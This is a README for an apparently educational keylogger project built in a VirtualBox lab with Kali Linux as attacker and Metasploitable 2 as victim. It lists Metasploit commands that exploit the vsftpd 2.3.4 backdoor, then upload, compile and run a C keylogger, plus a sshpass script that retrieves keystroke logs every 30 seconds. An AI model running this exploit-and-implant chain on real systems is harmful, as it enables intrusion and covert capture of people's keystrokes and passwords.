# keylogger-project


## Overview

This repository contains a Keylogger project. The project demonstrates the creation, deployment, and remote monitoring of a keylogger using two virtual machines: **Kali Linux** (attacker) and **Metasploitable 2** (victim). The keylogger captures keystrokes on the victim machine and periodically sends them to the attacker machine for analysis.


## Project Structure

The project consists of the following components:

1. **Keylogger (C Program)**: A custom keylogger written in C that captures keystrokes on the Metasploitable 2 victim machine and logs them to a file (`/tmp/keylogger_output.log`).
2. **Metasploit Exploitation**: Utilizes Metasploit on Kali Linux to exploit a vulnerability in Metasploitable 2’s vsftpd server, establish a Meterpreter session, and upload the keylogger.
3. **Periodic Log Fetcher (Bash Script)**: A Bash script (`periodic_cat.sh`) running on Kali Linux that fetches the keylogger’s output log from the victim machine every 30 seconds using `sshpass` for automated SSH access.

## Architecture

- **Attacker Machine**: Kali Linux (IP: `10.0.2.15`)
- **Victim Machine**: Metasploitable 2 (IP: `10.0.2.4`)
- **Virtualization Platform**: Oracle VirtualBox
- **Host OS**: Windows 11

The keylogger is uploaded to the victim machine via a Meterpreter session, compiled, and executed to capture keystrokes. The attacker retrieves the logged keystrokes periodically using SSH.

## Features

- **Keylogger Functionality**:
  - Captures raw keyboard input events from `/dev/input/eventX`.
  - Supports Shift key detection for accurate capitalization.
  - Logs keystrokes (e.g., letters, numbers, Enter, Backspace) to a specified file.
  - Runs as a background daemon process.
- **Remote Deployment**:
  - Exploits Metasploitable 2’s vsftpd vulnerability using Metasploit.
  - Uploads and compiles the keylogger remotely via Meterpreter.
- **Periodic Monitoring**:
  - Automatically fetches the keylogger’s log file every 30 seconds using a Bash script.
  - Displays captured keystrokes on the attacker’s terminal.

## Prerequisites

To replicate this project, you need:

- **Hardware/Software**:
  - A computer running Oracle VirtualBox.
  - Kali Linux ISO (for the attacker VM).
  - Metasploitable 2 ISO (for the victim VM).
  - Windows 11 (or any host OS supporting VirtualBox).
- **Tools**:
  - Metasploit Framework (pre-installed on Kali Linux).
  - `gcc` compiler on Metasploitable 2 (for compiling the keylogger).
  - `sshpass` on Kali Linux (for automated SSH log retrieval).
- **Network Setup**:
  - Both VMs configured on the same VirtualBox NAT network.
  - Assigned IPs: Kali Linux (`10.0.2.15`), Metasploitable 2 (`10.0.2.4`).

## Installation

1. **Set Up Virtual Machines**:
   - Install Oracle VirtualBox on your host machine.
   - Create two VMs and install Kali Linux and Metasploitable 2, respectively.
   - Configure both VMs to use a NAT network in VirtualBox.
   - Verify network connectivity by pinging between VMs.

2. **Install Dependencies**:
   - On Kali Linux:
     ```bash
     sudo apt update
     sudo apt install sshpass
     ```
   - On Metasploitable 2: Ensure `gcc` is available (usually pre-installed).

3. **Clone the Repository**:
   ```bash
   git clone https://github.com/aman181003/keylogger-project.git
   cd keylogger-project
   ```

## Usage

Follow these steps to run the project:

### Step 1: Build the Keylogger
- The keylogger source code is provided in `keylogger.c`.
- The C program captures keyboard events, logs them to a file, and runs in the background.
- No manual compilation is needed on Kali; it will be compiled on Metasploitable 2 later.

### Step 2: Establish a Meterpreter Session
1. Start Metasploit on Kali Linux:
   ```bash
   msfconsole
   ```
2. Exploit the vsftpd vulnerability on Metasploitable 2(10.0.2.4):
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS 10.0.2.4
   run
   ```
3. Upgrade to a Meterpreter session:
   ```bash
   use post/multi/manage/shell_to_meterpreter
   set SESSION 1
   run
   ```

### Step 3: Upload and Run the Keylogger
1. In the Meterpreter session, upload the keylogger:
   ```bash
   upload keylogger.c /tmp/keylogger.c
   ```
2. Access a shell and compile the keylogger on Metasploitable 2:
   ```bash
   shell
   cd /tmp
   gcc keylogger.c -o keylogger_exec
   chmod +x keylogger_exec
   ./keylogger_exec -l /tmp/keylogger_output.log
   ```
3. The keylogger now runs in the background, logging keystrokes to `/tmp/keylogger_output.log`.

### Step 4: Fetch Keystrokes Periodically
1. On Kali Linux, ensure the `periodic_cat.sh` script is executable:
   ```bash
   chmod +x periodic_cat.sh
   ```
2. Run the script to fetch the log file every 30 seconds:
   ```bash
   ./periodic_cat.sh
   ```
3. The script will display the contents of `/tmp/keylogger_output.log` from Metasploitable 2, updating every 30 seconds.

### Example Output
When you type commands like `Hello this is Aman` on Metasploitable 2, the keylogger captures:
```
Hello this is Aman<Enter>The keylogger is working fine<Enter>
```
The `periodic_cat.sh` script retrieves and displays this output on Kali Linux.

## Files in the Repository

- `keylogger.c`: Source code for the C-based keylogger.
- `periodic_cat.sh`: Bash script for fetching the keylogger’s log file periodically.
- `README.md`: This documentation file.



